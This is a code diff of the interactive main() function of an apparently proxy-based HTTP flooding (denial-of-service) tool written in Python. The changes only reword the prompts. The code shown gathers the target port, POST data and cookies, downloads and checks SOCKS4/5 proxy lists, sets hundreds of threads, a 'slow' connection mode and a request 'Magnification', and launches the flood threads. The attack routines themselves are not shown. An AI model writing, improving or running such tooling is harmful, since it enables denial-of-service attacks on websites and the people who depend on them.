@@ -621,39 +621,39 @@ def main():
 	port = str(input("[+] Port ( HTTPS is 443 ) : "))
 	if port == '':
 		port = int(80)
-		print("> Default choose port 80\r\n> Port 80 was chosen")
+		print("[+] Default Choose Port 80\r\n[+] Port 80 Was Chosen")
 	else:
 		port = int(port)
 		if str(port) == '443':
-			print("> [!] Enable SSL Mode")
+			print("[!] Enable SSL Mode")
 	if mode == "post":
-		mode2 = str(input("> Customize post data? (y/n, default=n):")).strip()
+		mode2 = str(input("[+] Customize Post Data? ( y / n Default=n ) : ")).strip()
 		if mode2 == "y":
-			data = open(input("> Input the file's path:").strip()).readlines()
+			data = open(input("[+] Input The File's Path : ").strip()).readlines()
 			data = ' '.join([str(txt) for txt in data])
-	choice2 = str(input("> Customize cookies? (y/n, default=n):")).strip()
+	choice2 = str(input("[+] Customize Cookies? ( y / n Default=n ) : ")).strip()
 	if choice2 == "y":
-		cookies = str(input("Plese input the cookies:")).strip()
+		cookies = str(input("[+] Plese İnput The Cookies : ")).strip()
 	choice = ""
 	while choice == "":
-		choice = str(input("> Choose your socks mode(4/5, default=5):")).strip()
+		choice = str(input("[+] Choose Your Socks Mode ( 4 / 5 Default=5 ) : ")).strip()
 		if choice == "":
 			choice = "5"
 		if choice != "4" and choice != "5":
-			print("> [!] Error Choice try again")
+			print("[!] Error Choice Try Again")
 			choice = ""
 		if choice == "4":
 			socks_type = 4
 		else:
 			socks_type = 5
 	if mode == "check":
-		N = str(input("> Do you need to get socks list?(y/n,default=y):"))
+		N = str(input("[+] Do You Need To Get Socks List? ( y / n Default=y ) : "))
 		if N == 'y' or N == "" :
 			downloadsocks(choice)
 		else:
 			pass
 		if choice == "4":
-			out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
+			out_file = str(input("[+] Socks4 Proxy File Path ( socks4.txt ) : "))
 			if out_file == '':
 				out_file = str("socks4.txt")
 			else:
@@ -661,20 +661,20 @@ def main():
 			check_list(out_file)
 			proxies = open(out_file).readlines()
 		elif choice == "5":
-			out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
+			out_file = str(input("[+] Socks5 Proxy File Path ( socks5.txt ) : "))
 			if out_file == '':
 				out_file = str("socks5.txt")
 			else:
 				out_file = str(out_file)
 			check_list(out_file)
 			proxies = open(out_file).readlines()
-		print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
+		print ("[+] Number Of Socks%s Proxies : %s" %(choice,len(proxies)))
 		time.sleep(0.03)
-		ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
+		ans = str(input("[+] Do U Need To Check The Socks List? ( y / n Default=y ) : "))
 		if ans == "":
 			ans = "y"
 		if ans == "y":
-			ms = str(input("> Delay of socks(seconds, default=1):"))
+			ms = str(input("[+] Delay Of Socks ( Seconds Default=1 ) : "))
 			if ms == "":
 				ms = int(1)
 			else :
@@ -683,12 +683,12 @@ def main():
 				except :
 					ms = float(ms)
 			check_socks(ms)
-		print("> End of process")
+		print("[+] End Of Process")
 		return
 	if mode == "slow":	
-		thread_num = str(input("> Connections(default=400):"))
+		thread_num = str(input("[+] Connections( Default=400) : "))
 	else:
-		thread_num = str(input("> Threads(default=400):"))
+		thread_num = str(input("[+] Threads ( Default=400 ) : "))
 	if thread_num == "":
 		thread_num = int(400)
 	else:
@@ -697,13 +697,13 @@ def main():
 		except:
 			sys.exit("Error thread number")
 	create_useragents(thread_num)
-	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
+	N = str(input("[+] Do You Need To Get Socks List ? ( y / n Default=y ) : "))
 	if N == 'y' or N == "" :
 		downloadsocks(choice)
 	else:
 		pass
 	if choice == "4":
-		out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
+		out_file = str(input("[+] Socks4 Proxy File Path ( socks4.txt ) : "))
 		if out_file == '':
 			out_file = str("socks4.txt")
 		else:
@@ -711,20 +711,20 @@ def main():
 		check_list(out_file)
 		proxies = open(out_file).readlines()
 	elif choice == "5":
-		out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
+		out_file = str(input("[+] Socks5 Proxy File Path ( socks5.txt ) : "))
 		if out_file == '':
 			out_file = str("socks5.txt")
 		else:
 			out_file = str(out_file)
 		check_list(out_file)
 		proxies = open(out_file).readlines()
-	print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
+	print ("[+] Number Of Socks%s Proxies : %s" %(choice,len(proxies)))
 	time.sleep(0.03)
-	ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
+	ans = str(input("[+] Do U Need To Check The Socks List ? ( y / n Default=y ) : "))
 	if ans == "":
 		ans = "y"
 	if ans == "y":
-		ms = str(input("> Delay of socks(seconds, default=1):"))
+		ms = str(input("[+] Delay Of Socks ( Seconds Default=1 ) : "))
 		if ms == "":
 			ms = int(1)
 		else :
@@ -734,12 +734,12 @@ def main():
 				ms = float(ms)
 		check_socks(ms)
 	if mode == "slow":
-		input("Press Enter to continue.")
+		input("[+] Press Enter To Continue.")
 		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
 		th.setDaemon(True)
 		th.start()
 	else:
-		multiple = str(input("> Input the Magnification(default=100):"))
+		multiple = str(input("[+] Input The Magnification ( Default=100 ) : "))
 		if multiple == "":
 			multiple = int(100)
 		else:
@@ -751,7 +751,7 @@ def main():
 			brute = True
 		elif brute == "n":
 			brute = False
-		input("Press Enter to continue.")
+		input("[+] Press Enter To Continue.")
 		if mode == "post":
 			for _ in range(thread_num):
 				th = threading.Thread(target = post,args=(socks_type,))
